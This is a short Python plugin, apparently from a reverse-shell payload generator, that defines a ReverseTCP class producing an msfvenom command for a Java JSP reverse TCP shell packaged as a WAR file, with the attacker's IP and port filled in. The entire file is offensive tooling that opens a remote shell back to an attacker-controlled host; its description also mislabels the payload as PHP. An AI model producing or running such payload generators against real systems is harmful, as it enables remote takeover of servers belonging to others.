from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()

        self.opts.description = "[ReverseShell][TCP] PHP from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        self.shell = """msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file""".format(self.args.ip, self.args.port)
